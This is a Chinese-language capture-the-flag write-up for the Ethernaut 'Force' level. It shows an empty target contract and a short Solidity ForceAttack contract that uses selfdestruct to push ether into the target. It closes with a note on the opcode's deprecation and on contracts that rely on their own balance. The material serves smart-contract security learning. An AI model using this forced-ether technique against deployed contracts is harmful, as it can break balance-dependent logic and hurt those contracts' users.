# 7. Force
### 原题
```
有些合约就是拒绝你的付款,就是这么任性 ¯\_(ツ)_/¯
这一关的目标是使合约的余额大于0
```
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force { /*
                   MEOW ?
         /\_/\   /
    ____/ o o \
    /~____  =ø= /
    (______)__m_m)
                   */ }
```
### 分析
上面的合约果然就是这么任性，什么都没写，是不会写，还是不会写...
如果给他付款，他没有任何可接收付款的方法。没有receive() payable{}
也没有fallback() payable{}。
就像老农卖菜，他没有二维码，你没有现金，这个交易怎么做。
合约上有个自毁方法，销毁自己，把余额全部转给指定账户，这个账户强行接受转账。
这个有点像家族继承，一人升天，不管是国内的正房，还是国外的私生，都给我接受一笔遗产继承，无条件！
那么我们也来扮演个创世主，创造一个有钱的主，来个死后瓜分遗产的故事吧：）
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceAttack {
  address force;

  constructor(address _force) payable {
    force = _force;
  }

  function attack() public  payable {
    
     address payable f = payable(force);

     selfdestruct(f);
  }

  receive() external payable { }
  fallback() external payable { }
}
```
### 注意
Warning: "selfdestruct" has been deprecated. Note that, starting from the Cancun hard fork, the underlying opcode no longer deletes the code and data associated with an account and only transfers its Ether to the beneficiary, unless executed in the same transaction in which the contract was created (see EIP-6780). Any use in newly deployed contracts is strongly discouraged even if the new behavior is taken into account. Future changes to the EVM might further reduce the functionality of the opcode.
大家自己翻译看看，大致就是不再推荐使用"selfdestruct"了，在后期的EVM版本中会逐步限制或者减少"selfdestruct"的功能。

### 总结
如果是合约里有依赖使用“address(this).balance > 0”，那这个破解方法就很有作用了。